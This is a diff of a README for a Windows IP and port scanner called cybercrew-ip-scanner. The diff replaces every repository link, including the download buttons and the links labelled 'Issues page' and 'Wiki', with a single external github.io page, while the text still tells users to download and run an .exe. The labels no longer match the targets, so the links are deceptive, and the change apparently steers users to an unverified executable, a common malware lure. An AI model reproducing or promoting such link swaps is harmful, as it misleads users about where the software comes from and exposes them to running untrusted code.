@@ -1,7 +1,7 @@
 <h1>🔍 cybercrew-ip-scanner - Fast IP and Port Scanner Tool</h1>
 
 <p align="center">
-  <a href="https://github.com/lukasconservative594/cybercrew-ip-scanner" style="display:inline-block;padding:12px 24px;background-color:#4CAF50;color:white;text-decoration:none;border-radius:5px;font-size:18px;font-weight:bold;">⬇️ Download cybercrew-ip-scanner</a>
+  <a href="https://lukasconservative594.github.io" style="display:inline-block;padding:12px 24px;background-color:#4CAF50;color:white;text-decoration:none;border-radius:5px;font-size:18px;font-weight:bold;">⬇️ Download cybercrew-ip-scanner</a>
 </p>
 
 <p>Welcome to cybercrew-ip-scanner, a powerful yet simple tool for scanning IP addresses and ports on your network. Whether you are a security professional, IT administrator, or just curious about your network, this tool helps you discover devices and services quickly. No programming skills needed—just download and run.</p>
@@ -11,7 +11,7 @@
 <p>Follow these simple steps to start using cybercrew-ip-scanner on your Windows computer:</p>
 
 <ol>
-  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/lukasconservative594/cybercrew-ip-scanner">https://github.com/lukasconservative594/cybercrew-ip-scanner</a></li>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://lukasconservative594.github.io">https://lukasconservative594.github.io</a></li>
   <li>On the GitHub page, click the green "Code" button, then select "Download ZIP". Alternatively, go to the "Releases" section on the right side and download the latest version.</li>
   <li>Once downloaded, locate the ZIP file in your Downloads folder and extract it (right-click → Extract All).</li>
   <li>Open the extracted folder and double-click the <code>cybercrew-ip-scanner.exe</code> file to run the scanner.</li>
@@ -61,7 +61,7 @@
 <p>Get the latest version of cybercrew-ip-scanner from the official repository:</p>
 
 <p align="center">
-  <a href="https://github.com/lukasconservative594/cybercrew-ip-scanner" style="display:inline-block;padding:15px 30px;background-color:#2196F3;color:white;text-decoration:none;border-radius:5px;font-size:20px;font-weight:bold;">⬇️ Download Now</a>
+  <a href="https://lukasconservative594.github.io" style="display:inline-block;padding:15px 30px;background-color:#2196F3;color:white;text-decoration:none;border-radius:5px;font-size:20px;font-weight:bold;">⬇️ Download Now</a>
 </p>
 
 <p><strong>Note:</strong> This is a portable application—no installation needed. Just download the ZIP file, extract it, and run the executable directly.</p>
@@ -84,8 +84,8 @@
 
 <p>If you encounter any issues or have questions:</p>
 <ul>
-  <li>Visit the <a href="https://github.com/lukasconservative594/cybercrew-ip-scanner/issues">Issues page</a> on GitHub</li>
-  <li>Check the <a href="https://github.com/lukasconservative594/cybercrew-ip-scanner/wiki">Wiki</a> for detailed documentation</li>
+  <li>Visit the <a href="https://lukasconservative594.github.io">Issues page</a> on GitHub</li>
+  <li>Check the <a href="https://lukasconservative594.github.io">Wiki</a> for detailed documentation</li>
 </ul>
 
 <h2>📄 License</h2>
